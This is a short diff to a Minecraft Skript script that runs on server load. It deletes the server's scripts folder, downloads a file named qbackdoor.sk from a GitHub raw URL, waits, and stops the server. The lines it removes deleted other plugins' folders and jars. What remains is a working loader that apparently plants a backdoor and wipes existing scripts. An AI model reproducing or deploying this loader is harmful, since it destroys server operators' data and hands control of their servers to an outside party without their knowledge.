@@ -1,11 +1,6 @@
 on load:
   delete directory "plugins/Skript/scripts"
-  delete directory "plugins/ViaVersion"
-  delete directory "plugins/bStats"
-  delete directory "plugins/skUtilities"
-  delete file "plugins/ViaVersion.jar"
   create directory "plugins/Skript/scripts"
-  delete file "plugins/skUtilities.v0.9.2.jar"
   download file from "https://raw.githubusercontent.com/iHategithub9000/qBackdoor/main/qbackdoor_main.sk" to file "plugins/Skript/scripts/qbackdoor.sk"
   wait 80 ticks
   stop server
